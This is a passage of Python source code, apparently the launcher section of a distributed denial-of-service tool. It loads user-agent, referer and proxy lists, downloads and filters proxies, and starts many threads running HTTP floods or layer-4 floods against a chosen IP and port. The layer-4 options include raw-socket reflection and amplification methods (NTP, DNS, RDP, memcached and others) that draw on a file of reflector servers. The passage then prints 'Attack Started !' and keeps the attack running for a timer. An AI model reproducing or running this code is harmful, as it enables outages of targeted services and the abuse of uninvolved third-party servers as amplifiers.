                    useragent_li = Path(currentDir / "files/useragent.txt")
                    referers_li = Path(currentDir / "files/referers.txt")
                    proxies: Any = set()

                    if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
                    if not referers_li.exists(): exit("The Referer file doesn't exist ")

                    uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                    referers = set(a.strip() for a in referers_li.open("r+").readlines())

                    if not uagents: exit("Empty Useragent File ")
                    if not referers: exit("Empty Referer File ")

                    if proxy_ty not in {4, 5, 1, 0}: exit("Socks Type Not Found [4, 5, 1, 0]")
                    if threads > 1000: print("WARNING! thread is higher than 1000")
                    if rpc > 100: print("WARNING! RPC (Request Pre Connection) is higher than 100")

                    if not proxy_li.exists():
                        if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
                        proxy_li.parent.mkdir(parents=True, exist_ok=True)
                        with proxy_li.open("w") as wr:
                            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
                            print(f"{len(Proxies):,} Proxies are getting checked, this may take awhile !")
                            Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
                            if not Proxies:
                                exit(
                                    "Proxy Check failed, Your network may be the problem | The target may not be"
                                    " available.")
                            stringBuilder = ""
                            for proxy in Proxies:
                                stringBuilder += (proxy.__str__() + "\n")
                            wr.write(stringBuilder)

                    proxies = ProxyUtiles.readFromFile(proxy_li)
                    if not proxies:
                        print("Empty Proxy File, Running flood witout proxy")
                        proxies = None
                    if proxies:
                        print(f"Proxy Count: {len(proxies):,}")
                    for _ in range(threads):
                        thread = Thread(target=HttpFlood, args=(url, method, rpc, event, uagents, referers, proxies,), daemon=True)
                        thread.start()
                        threads_list.append(thread)

                if method in Methods.LAYER4_METHODS:
                    target = argv[2].strip()
                    if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
                    port = 53 if ":" not in target else int(target.split(":")[1])
                    threads = int(argv[3])
                    timer = int(argv[4])
                    ref = None

                    if ":" not in target:
                        print("WARNING! Port Not Selected, Set To Default: 80")
                    else:
                        target = target.split(":")[0]

                    if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                    if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
                    print(f"IP: {target}")
                    print(f"Port: {port}")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                            not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                        if len(argv) == 6:
                            refl_li = Path(currentDir / "files" / argv[5].strip())
                            if not refl_li.exists(): exit("The Reflector file doesn't exist ")
                            ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
                        if not ref: exit("Empty Reflector File ")

                    for _ in range(threads):
                        thread = Thread(target=Layer4, args=((target, port), ref, method, event,), daemon=True)
                        thread.start()
                        threads_list.append(thread)

                print("Attack Started !")
                event.set()
                while timer:
                    timer -= 1
                    sleep(1)
                event.clear()
                exit()

            ToolsConsole.usage()


if __name__ == '__main__':
    start()
